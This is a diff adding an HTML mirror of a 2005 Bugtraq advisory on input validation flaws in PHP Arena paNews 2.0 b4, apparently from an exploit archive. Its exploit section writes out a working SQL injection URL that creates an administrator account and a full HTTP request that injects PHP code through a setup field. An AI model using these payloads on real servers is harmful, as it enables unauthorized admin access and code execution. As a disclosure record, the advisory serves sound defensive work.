@@ -1,0 +1,96 @@
+#SpeeDr00t@Black Falcon<br>#bid12687<p><b><span style="font-size: 18pt;">PHP Arena PANews Remote Input Validation Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/12687/info">info</a><br><a href="http://www.securityfocus.com/bid/12687/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/12687/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/12687/solution">solution</a><br><a href="http://www.securityfocus.com/bid/12687/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				12687
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Mar 01 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Mar 01 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				FraMe &lt;frame@kernelpanik.org&gt; is credited with the discovery of this issue.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					PHP Arena paNews 2.0 b4<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x13000/12687/paNews.c">#exploit_paNews.c</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	No exploit is required to leverage these issues.  The following proof of concept has been provided:<br/><br/>SQL injection proof of concept:<br/>http://www.example.com/panews/index.php?action=login&amp;username=frame&amp;password=amo&amp;mysql_prefix=panews_auth` VALUES ("","frame","d41d8cd98f00b204e9800998ecf8427e","hackit","admins|cat|comment|newsadd|newsedit|prefset|setup","none","127.0.0.1",1,1)%00<br/><br/>Script injection proof of concept:<br/>GET http://hawking/panews/index.php?action=admin&amp;op=setup&amp;formlang=english&amp;formcomments=1&amp;formautoapprove=1;%20?%3E%20%3C?%20include(%22/var/cpuinfo%22);%20?%3E%20%3C?%20$trivial=1 HTTP/1.1<br/>Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5<br/>Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7<br/>Accept-Encoding: gzip,deflate<br/>Accept-Language: en-us,en;q=0.5<br/>Host: hawking<br/>Referer: http://hawking/panews/index.php<br/>User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041111 Firefox/1.0<br/>Cookie: panews=%BF%3F%BF%3F0%BF%3F1108908178%BF%3F%BF%3Fframe%BF%3F0; IS_PANEWS=1<br/>Keep-Alive: 300<br/><br/>Proof of concept paNews.c has been released by Silentium.  It exploits the SQL injection issue to create a new user with administrator privileges on an affected server.
+	
+		<ul>
+<li><a href="/data/vulnerabilities/exploits/paNews.c">/data/vulnerabilities/exploits/paNews.c</a></li>
+</ul>
+</div>
